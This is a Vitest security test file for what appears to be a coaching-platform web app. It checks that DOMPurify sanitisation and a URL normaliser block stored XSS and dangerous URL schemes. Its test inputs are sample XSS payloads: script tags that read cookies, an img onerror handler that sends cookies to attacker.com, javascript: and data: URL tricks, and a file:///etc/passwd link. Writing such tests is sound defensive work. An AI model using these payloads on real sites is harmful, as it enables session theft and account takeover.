import { describe, it, expect } from 'vitest'
import DOMPurify from 'dompurify'
import { normalizeUrl } from '../../src/utils/formatters'

describe('SEC-002: Stored XSS Mitigation via DOMPurify', () => {
  it('strips <script> tags from batch detailed info HTML', () => {
    const maliciousPayload = '<p>Physics Mechanics</p><script>window.pwned=true;alert(document.cookie)</script>'
    const sanitized = DOMPurify.sanitize(maliciousPayload)

    expect(sanitized).not.toContain('<script>')
    expect(sanitized).not.toContain('window.pwned')
    expect(sanitized).not.toContain('alert(document.cookie)')
    expect(sanitized).toContain('<p>Physics Mechanics</p>')
  })

  it('strips onerror and onload event handlers from images', () => {
    const maliciousPayload = '<img src="invalid-image.jpg" onerror="fetch(\'https://attacker.com/steal?data=\'+document.cookie)" />'
    const sanitized = DOMPurify.sanitize(maliciousPayload)

    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('attacker.com')
  })

  it('strips javascript: pseudo-protocols from hyperlinks in DOMPurify', () => {
    const maliciousPayload = '<a href="javascript:alert(1)">Click to download syllabus</a>'
    const sanitized = DOMPurify.sanitize(maliciousPayload)

    expect(sanitized).not.toContain('javascript:')
    expect(sanitized).toContain('Click to download syllabus')
  })

  it('strips malicious <iframe> and <object> embed vectors', () => {
    const maliciousPayload = '<iframe src="https://evil.example.com/phishing"></iframe><object data="exploit.swf"></object>'
    const sanitized = DOMPurify.sanitize(maliciousPayload)

    expect(sanitized).not.toContain('<iframe')
    expect(sanitized).not.toContain('<object')
  })

  it('preserves legitimate curriculum formatting and HTML elements', () => {
    const legitimateHTML = `
      <h3>Batch Curriculum & Overview</h3>
      <p>Welcome to <strong>JEE Advanced Masterclass</strong>.</p>
      <ul>
        <li>Vectors & Kinematics</li>
        <li>Thermodynamics</li>
      </ul>
      <table>
        <thead><tr><th>Week</th><th>Topic</th></tr></thead>
        <tbody><tr><td>1</td><td>Newton's Laws</td></tr></tbody>
      </table>
    `
    const sanitized = DOMPurify.sanitize(legitimateHTML)

    expect(sanitized).toContain('<h3>Batch Curriculum &amp; Overview</h3>')
    expect(sanitized).toContain('<strong>JEE Advanced Masterclass</strong>')
    expect(sanitized).toContain('<li>Vectors &amp; Kinematics</li>')
    expect(sanitized).toContain('<table>')
    expect(sanitized).toContain('<td>Newton\'s Laws</td>')
  })
})

describe('SEC-002: URL Scheme Sanitization in normalizeUrl', () => {
  it('blocks dangerous javascript: execution pseudo-protocol', () => {
    expect(normalizeUrl('javascript:alert(1)')).toBe('')
    expect(normalizeUrl('  javascript:alert(document.cookie)  ')).toBe('')
    expect(normalizeUrl('JAVASCRIPT:alert(window.origin)')).toBe('')
    expect(normalizeUrl('javascript:/*--></title></style></textarea><em><script>alert(1)</script>')).toBe('')
  })

  it('blocks obfuscated and whitespace-padded javascript: schemes', () => {
    expect(normalizeUrl('java\0script:alert(1)')).toBe('')
    expect(normalizeUrl('javascript :alert(1)')).toBe('')
    expect(normalizeUrl('java\tscript:alert(1)')).toBe('')
  })

  it('blocks data: URI schemes to prevent payload injection', () => {
    expect(normalizeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe('')
    expect(normalizeUrl('DATA:text/html,<script>alert(1)</script>')).toBe('')
  })

  it('blocks vbscript:, blob:, and file: schemes', () => {
    expect(normalizeUrl('vbscript:msgbox("xss")')).toBe('')
    expect(normalizeUrl('blob:https://example.com/uuid-hash')).toBe('')
    expect(normalizeUrl('file:///etc/passwd')).toBe('')
  })

  it('allows and normalizes legitimate web URLs', () => {
    expect(normalizeUrl('https://meet.google.com/xyz-abc-def')).toBe('https://meet.google.com/xyz-abc-def')
    expect(normalizeUrl('http://example.com')).toBe('http://example.com')
    expect(normalizeUrl('meet.google.com/xyz-abc-def')).toBe('https://meet.google.com/xyz-abc-def')
    expect(normalizeUrl('//cdn.example.com/assets/video.mp4')).toBe('https://cdn.example.com/assets/video.mp4')
  })

  it('allows safe communications schemes (mailto, tel)', () => {
    expect(normalizeUrl('mailto:admissions@thoughtfulacademy.com')).toBe('mailto:admissions@thoughtfulacademy.com')
    expect(normalizeUrl('tel:+919876543210')).toBe('tel:+919876543210')
  })

  it('safely handles empty, null, and undefined inputs', () => {
    expect(normalizeUrl('')).toBe('')
    expect(normalizeUrl(null)).toBe('')
    expect(normalizeUrl(undefined)).toBe('')
  })
})
